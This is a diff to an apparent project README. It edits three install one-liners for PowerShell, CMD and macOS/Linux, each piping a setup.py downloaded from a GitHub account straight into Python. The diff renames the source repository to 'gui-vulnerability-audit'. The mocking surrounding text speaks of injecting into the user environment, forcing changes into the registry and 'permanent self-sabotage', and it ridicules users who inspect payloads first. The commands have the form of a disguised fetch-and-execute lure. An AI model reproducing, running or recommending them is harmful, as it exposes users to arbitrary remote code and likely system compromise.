@@ -361,19 +361,19 @@ Run this single line to automatically detect your operating system archetype, au
 ##### 🪟 Windows (PowerShell)
 The gold standard for automated self-reflection. Run this to gracefully inject a reality check directly into your user environment scope:
 ```powershell
-curl -sSL https://raw.githubusercontent.com/GoogleHub67/GoogleHub67/main/setup.py | python -
+curl -sSL https://raw.githubusercontent.com/GoogleHub67/gui-vulnerability-audit/main/setup.py | python -
 ```
 
 ##### 🖥️ Windows CMD (Command Prompt)
 If you refuse to leave the 1990s and prefer your automation served cold, force it straight into your registry to spawn a fresh diagnostic scope:
 ```cmd
-curl -sSL https://raw.githubusercontent.com/GoogleHub67/GoogleHub67/main/setup.py | python -
+curl -sSL https://raw.githubusercontent.com/GoogleHub67/gui-vulnerability-audit/main/setup.py | python -
 ```
 
 ##### 🍏 / 🐧 macOS & Linux (Terminal)
 For the Linux gatekeepers and macOS purists who think using a terminal makes them an elite hacker. Permanent self-sabotage is just an append command away:
 ```bash
-curl -sSL https://raw.githubusercontent.com/GoogleHub67/GoogleHub67/main/setup.py | python3 -
+curl -sSL https://raw.githubusercontent.com/GoogleHub67/gui-vulnerability-audit/main/setup.py | python3 -
 ```
 
 If you are Paranoid/Isolated and you suffer from trust issues, pride yourself on reading payloads locally, and refuse to pipe raw URLs directly into your terminal, we have anticipated your exact behavioural vector. Evaluate your sandboxed isolation container as much as you wish. You have got the freedom to, so use it wisely. 
